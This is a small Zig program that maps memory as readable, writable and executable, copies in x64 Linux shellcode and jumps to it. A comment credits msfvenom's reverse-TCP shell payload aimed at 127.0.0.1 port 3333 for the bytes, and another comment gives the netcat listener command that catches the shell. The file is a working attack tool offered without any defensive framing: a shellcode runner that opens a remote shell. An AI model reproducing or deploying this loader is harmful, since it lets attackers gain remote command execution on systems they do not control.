const std = @import("std");
const os = std.os;
const mem = std.mem;

// msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=3333 -f c
const shellcode = "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48\xb9\x02\x00\x0d\x05\x7f\x00\x00\x01\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";
// listener:
// nc -nlvp 3333

pub fn main() !void {
    var img = try std.os.mmap(null, shellcode.len, os.PROT.READ | os.PROT.WRITE | os.PROT.EXEC, os.MAP.PRIVATE | os.MAP.ANONYMOUS, -1, 0);
    mem.copy(u8, img, shellcode);

    const f: *const fn (...) callconv(.C) c_int = @ptrCast(*const fn (...) callconv(.C) c_int, img);
    _ = f();
}
